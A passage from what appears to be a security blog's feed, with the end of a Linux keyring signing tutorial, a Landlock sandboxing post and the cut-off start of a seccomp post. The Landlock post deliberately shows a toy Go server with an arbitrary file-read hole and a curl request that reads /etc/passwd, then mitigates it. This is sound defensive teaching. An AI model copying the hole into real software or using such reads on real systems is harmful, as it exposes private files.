</span></span><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#39;&lt;http://localhost:8080/verify&#39;</span>&gt; --data <span style="color:#e6db74">&#39;{&#34;signature&#34;:&#34;QO1mZet+wpgODp+fs8PbfHvKqYBrX2OGxfxDyT8e+tH7DBVyBUafFNCTCbEiFrhm0urgrON9GkQBdv/0REpIBw==&#34;, &#34;payload&#34;:&#34;some_data_1693228868&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>*   Trying 127.0.0.1:8080...
</span></span><span style="display:flex;"><span>* Connected to localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
</span></span><span style="display:flex;"><span>&gt; POST /verify HTTP/1.1
</span></span><span style="display:flex;"><span>&gt; Host: localhost:8080
</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.0.1
</span></span><span style="display:flex;"><span>&gt; Accept: */*
</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#ae81ff">138</span>
</span></span><span style="display:flex;"><span>&gt; Content-Type: application/x-www-form-urlencoded
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>&lt; Date: Mon, <span style="color:#ae81ff">28</span> Aug <span style="color:#ae81ff">2023</span> 13:22:14 GMT
</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>&lt; 
</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host localhost left intact</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># let&#39;s try to verify with a different payload, e.g. changing the last digit to 9 in payload</span>
</span></span><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#39;&lt;http://localhost:8080/verify&#39;</span>&gt; --data <span style="color:#e6db74">&#39;{&#34;signature&#34;:&#34;QO1mZet+wpgODp+fs8PbfHvKqYBrX2OGxfxDyT8e+tH7DBVyBUafFNCTCbEiFrhm0urgrON9GkQBdv/0REpIBw==&#34;, &#34;payload&#34;:&#34;some_data_1693228869&#34;}&#39;</span>
</span></span><span style="display:flex;"><span>*   Trying 127.0.0.1:8080...
</span></span><span style="display:flex;"><span>* Connected to localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
</span></span><span style="display:flex;"><span>&gt; POST /verify HTTP/1.1
</span></span><span style="display:flex;"><span>&gt; Host: localhost:8080
</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.0.1
</span></span><span style="display:flex;"><span>&gt; Accept: */*
</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#ae81ff">138</span>
</span></span><span style="display:flex;"><span>&gt; Content-Type: application/x-www-form-urlencoded
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized
</span></span><span style="display:flex;"><span>&lt; Date: Mon, <span style="color:#ae81ff">28</span> Aug <span style="color:#ae81ff">2023</span> 13:23:03 GMT
</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>&lt; 
</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host localhost left intact</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>In this article we’ve seen how to use Linux Keyrings to store sensitive information such as keys. We’ve seen how to use the keyctl commandline tool to create/delete/update keys and keyrings. Then we’ve seen how to use the golang/x/unix package to interact with the kernel keyring, as it provides syscalls wrappers, and the crypto/ed25519 package to create/parse keys, sign and verify the payload. It is a lot of material to digest, but it is worth to improve security of our applications, and moreover it is fun to learn new things! Please consider that we scratched the surface of a huge topic, so the motivated person is encouraged to go through man pages and dive deeper into the topic.</p>
]]></content>
        </item>
        
        <item>
            <title>Intro to Landlock</title>
            <link>https://example.org/posts/11-landlock-2023/</link>
            <pubDate>Tue, 25 Jul 2023 00:00:00 +0000</pubDate>
            
            <guid>https://example.org/posts/11-landlock-2023/</guid>
            <description>In a previous article we shown up how it is possible to make our applications more secure through the use of seccomp which allows us to restrict the syscalls that a process or a thread can invoke. In this article we will see how to use Landlock LSM to further improve the security of our applications.
Introduction: What&amp;rsquo;s Landlock? Landlock is a Linux security module that allows to restrict the access to the filesystem.</description>
            <content type="html"><![CDATA[<p>In a previous article we shown up how it is possible to make our applications more secure through
the use of seccomp which allows us to restrict the syscalls that a process or a thread can invoke. In this article we will see how to use Landlock LSM to further improve the security of our applications.</p>
<h2 id="introduction-whats-landlock">Introduction: What&rsquo;s Landlock?</h2>
<p>Landlock is a Linux security module that allows to restrict the access to the filesystem. Quoting the documentation page:</p>
<pre tabindex="0"><code>The goal of Landlock is to enable to restrict ambient rights (e.g. global filesystem access) for a set of processes. Because Landlock is a stackable LSM, it makes possible to create safe security sandboxes as new security layers in addition to the existing system-wide access-controls. This kind of sandbox is expected to help mitigate the security impact of bugs or unexpected/malicious behaviors in user space applications. Landlock empowers any process, including unprivileged ones, to securely restrict themselves.
</code></pre><p>In other words, Landlock allows a user space application to create a ruleset which will be used to restrict the access to the filesystem. In order for an application to use landlock it needs to first create a ruleset which contains the available rules. Check the documentation here for the explanation of the available access rights.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Define a new ruleset
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> landlock_ruleset_attr ruleset_attr <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .handled_access_fs <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_EXECUTE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_WRITE_FILE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_READ_FILE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_READ_DIR <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_REMOVE_DIR <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_REMOVE_FILE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_CHAR <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_DIR <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_REG <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_SOCK <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_FIFO <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_BLOCK <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_MAKE_SYM <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_REFER <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_TRUNCATE,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Call into the kernel to create the ruleset
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> ruleset_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">syscall</span>(SYS_landlock_create_ruleset,
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>ruleset_attr, <span style="color:#66d9ef">sizeof</span>(ruleset_attr));
</span></span></code></pre></div><p>We can then starting to add rules to the ruleset to restrict the access to the filesystem. In order to do so we need to first create a <code>landlock_path_beneath_attr struct</code> which contains the access rights we want to grant to the process and the parent directory file descriptor. We can then add the rule to the ruleset with the <code>landlock_add_rule</code> syscall.</p>
<p>For example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> landlock_path_beneath_attr path_beneath <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .allowed_access <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_READ_FILE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        LANDLOCK_ACCESS_FS_READ_DIR,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>path_beneath.parent_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/my_app_data&#34;</span>, O_PATH <span style="color:#f92672">|</span> O_CLOEXEC);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>err <span style="color:#f92672">=</span> <span style="color:#a6e22e">landlock_add_rule</span>(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH,
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&amp;</span>path_beneath, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">close</span>(path_beneath.parent_fd);
</span></span></code></pre></div><p>Then we just need to load the ruleset into the kernel and we’re done.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// forbid this thread from getting new privileges
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">landlock_restrict_self</span>(ruleset_fd, <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">close</span>(ruleset_fd);
</span></span></code></pre></div><h2 id="example-of-vulnerable-go-application">Example of vulnerable Go application</h2>
<p>Now we’re going to see how to use Landlock to secure a vulnerable Go application.
Suppose we’ve a vulnerable application like the following one (please notice this is just a toy example, it is not meant to be used in production or took as a reference for your own applications):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net/http&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">RequestURI</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">path</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>().<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;path&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#a6e22e">path</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusNotFound</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">f</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">buf</span>)
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:9999&#34;</span>, <span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This application simply reads a path query parameter value which is used to open a file and return its content. This application is vulnerable because it is possible to read any file on the filesystem, for example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl &lt;http://localhost:9999/?path<span style="color:#f92672">=</span>/etc/passwd&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h2 id="mitigating-the-vulnerability-with-landlock">Mitigating the vulnerability with Landlock</h2>
<p>Now we’re going to patch our application in order to use Landlock and guarantee access just to the path where its data is stored. For simplicity it will be the current directory where we ran it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">landlock</span>.<span style="color:#a6e22e">V3</span>.<span style="color:#a6e22e">BestEffort</span>().<span style="color:#a6e22e">RestrictPaths</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">landlock</span>.<span style="color:#a6e22e">RODirs</span>(<span style="color:#e6db74">&#34;.&#34;</span>),
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">RequestURI</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">path</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>().<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;path&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#a6e22e">path</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusNotFound</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">f</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">buf</span>)
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:9999&#34;</span>, <span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We first select the last ABI version of Landlock which is V3, and the then invoke the <code>BestEffort</code> function which will return the strictest possible configuration up to this ABI. Then we call the <code>RestrictPaths</code> which will add an approriate rule to the ruleset in order to restrict the access to the current directory.</p>
<p>Let’s try to run the application again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -v &lt;http://localhost:9999/?path<span style="color:#f92672">=</span>/etc/passwd&gt;
</span></span><span style="display:flex;"><span>* Uses proxy env variable no_proxy <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;localhost,127.0.0.0/8,::1&#39;</span>
</span></span><span style="display:flex;"><span>*   Trying 127.0.0.1:9999...
</span></span><span style="display:flex;"><span>* Connected to localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">9999</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
</span></span><span style="display:flex;"><span>&gt; GET /?path<span style="color:#f92672">=</span>/etc/passwd HTTP/1.1
</span></span><span style="display:flex;"><span>&gt; Host: localhost:9999
</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.0.1
</span></span><span style="display:flex;"><span>&gt; Accept: */*
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
</span></span><span style="display:flex;"><span>&lt; Date: Mon, <span style="color:#ae81ff">12</span> Jun <span style="color:#ae81ff">2023</span> 11:28:10 GMT
</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>&lt; 
</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host localhost left intact</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># in another shell were our application is logging we get</span>
</span></span><span style="display:flex;"><span>2023/06/12 11:20:19 /?path<span style="color:#f92672">=</span>/etc/passwd
</span></span><span style="display:flex;"><span>2023/06/12 11:20:19 open /etc/passwd: permission denied
</span></span></code></pre></div><p>As we can see the application is not able to read the /etc/passwd file anymore. So Landlock implicitly mitigated the vulnerability. Seccomp and Landlock together can be a very effective combination of security measures to mitigate vulnerabilities in your applications, and they are both available as bindings for multiple languages.</p>
]]></content>
        </item>
        
        <item>
            <title>Intro to Seccomp</title>
            <link>https://example.org/posts/12-seccomp-2023/</link>
            <pubDate>Tue, 17 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>https://example.org/posts/12-seccomp-2023/</guid>
            <description>Whenever we run a program on our machine, it runs with the same privileges as the user that started it. This is a problem, because it means that if we run a program that has a bug in it, if exploited, that bug can be used to compromise the whole machine. This is why it is important to run programs with the least amount of privileges possible.
One way to do this is to use a sandbox.</description>
            <content type="html"><![CDATA[<p>Whenever we run a program on our machine, it runs with the same privileges as the user that started it. This is a problem, because it means that if we run a program that has a bug in it, if exploited, that bug can be used to compromise the whole machine. This is why it is important to run programs with the least amount of privileges possible.</p>
<p>One way to do this is to use a sandbox. A sandbox is a program that runs another program, but with a limited set of privileges. This is a good way to run untrusted code, because if the untrusted code exploits a bug, it can only do so much damage. The sandbox can also be used to limit the resources that the untrusted code can use, such as the amount of memory it can use, or the amount of CPU time it can use.</p>
<h2 id="what-is-seccomp">What is Seccomp?</h2>
<p>On Linux and in general on other operating systems too, a program invokes system calls in order to request services from the operating system. For example, if a program wants to read a file, it will make a system call to the operating system to do so. If a program wants to open a socket, it will make a system call to the operating system to do so. If a program wants to print something to the screen, it will make a system call to the operating system to do so.</p>
<p>A program which presents a bug that allows an attacker to divert the program’s control flow to an attacker-controlled location is called a “code injection” vulnerability. This is a very serious vulnerability, because it means that the attacker can run arbitrary code on the machine. This is why it is important to run programs with the least amount of privileges possible. An attacker can then use such a vulnerability to invoke system calls that the program would have not been able to invoke, and thus make the program do things that it would not have been able to do otherwise.</p>
<p>Quoting the <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccomp</a> Linux man pages:</p>
<pre tabindex="0"><code>The seccomp() system call operates on the Secure Computing (seccomp) state of the calling process.
</code></pre><p>Seccomp is a Linux kernel feature that allows a program to limit the set of system calls that it can invoke. Suppose that we
have a program that needs to read a file, but we don’t want it to be able to open a socket. We can use Seccomp to tell the kernel that the program is only allowed to invoke the read system call, and not the socket system call. If the program tries to invoke the socket system call, the kernel will return an error to the program, and the program will be terminated.</p>
<h2 id="how-does-seccomp-work">How does Seccomp work?</h2>
<p>Seccomp utilizes <a href="https://en.wikipedia.org/wiki/Berkeley_Packet_Filter">BPF</a> (Berkeley Packet Filter) to filter system calls. BPF is a bytecode-based virtual machine that is used to filter packets in the Linux kernel. Seccomp uses BPF to filter system calls. The BPF program is executed by the kernel every time a system call is invoked. The BPF program can then decide whether to allow the system call or not. Notice that the BPF program is jited by the kernel if <code>CONFIG_BPF_JIT</code> is enabled. This means that it gets translated into machine code, and thus it runs very fast.</p>
<h2 id="how-to-use-seccomp">How to use Seccomp?</h2>
<p>Following is the signature of the seccomp system call:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">seccomp</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> operation, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> flags, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>args);
</span></span></code></pre></div><p>The operation argument specifies the operation to perform. The flags argument specifies the flags to use. The args argument specifies the arguments to use.</p>
<p>The operation argument we’re interested in is <code>SECCOMP_SET_MODE_FILTER</code>. This operation sets the seccomp filter for the calling process. We’re going to ignore the flags for now and focus on the args argument.</p>
<p>The args argument is a pointer to a <code>struct sock_fprog</code> structure. This structure contains a pointer to a BPF program, and the length of the BPF program. The BPF program is an array of <code>struct sock_filter</code> structures. Each <code>struct sock_filter</code> structure contains a BPF instruction.</p>
<p>When our program executes a syscall the kernel uses as an argument to the BPF program a pointer to a <code>struct seccomp_data</code> structure. This structure contains information about the system call that is being invoked. The BPF program can use this information to decide whether to allow the system call or not.</p>
<p>The <code>struct seccomp_data</code> structure has the following fields:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> seccomp_data {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nr;                     <span style="color:#75715e">/* System call number */</span>
</span></span><span style="display:flex;"><span>    __u32 arch;                 <span style="color:#75715e">/* AUDIT_ARCH_* value */</span>
</span></span><span style="display:flex;"><span>    __u64 instruction_pointer;  <span style="color:#75715e">/* Instruction pointer */</span>
</span></span><span style="display:flex;"><span>    __u64 args[<span style="color:#ae81ff">6</span>];              <span style="color:#75715e">/* Arguments to the system call */</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>The nr field contains the system call number. The <code>arch</code> field contains the architecture of the system call. The <code>instruction_pointer</code> field contains the instruction pointer of the system call. The args field contains the arguments to the system call.</p>
<p>The <code>seccomp</code> manual suggest to verify the architecture of the system call before allowing it. This is done by checking the arch field of the <code>struct seccomp_data</code> structure. If the architecture is not the one we expect, we can kill the process by returning <code>SECCOMP_RET_KILL</code> from the BPF program. This is because based on the architecture syscall numbers are different. For example, the <code>read</code> system call on <code>x86</code> has a syscall number of <code>3</code>, but on <code>x86_64</code> it has a syscall number of <code>0</code>. If we don’t check the architecture, we might allow the read system call on <code>x86</code>, but not on <code>x86_64</code>, and vice versa.</p>
<p>Bare also in mind that multiple filters can be installed. Filters are executed in reverse order in regards to their addition. This means that the last filter added will be executed first.</p>
<h2 id="example-1--allow-only-the-read-system-call">Example 1 – Allow only the read system call</h2>
<p>In the following example we’re going to allow only the <code>read</code> system call. We’re going to use the <code>SECCOMP_RET_ALLOW</code> action to allow the system call, and the <code>SECCOMP_RET_KILL</code> action to kill the process if the system call is not allowed. This first example will use the raw seccomp system call. We’ll see later that we can use libseccomp to make this easier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/audit.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/filter.h&gt;</span><span style="color:#75715e">
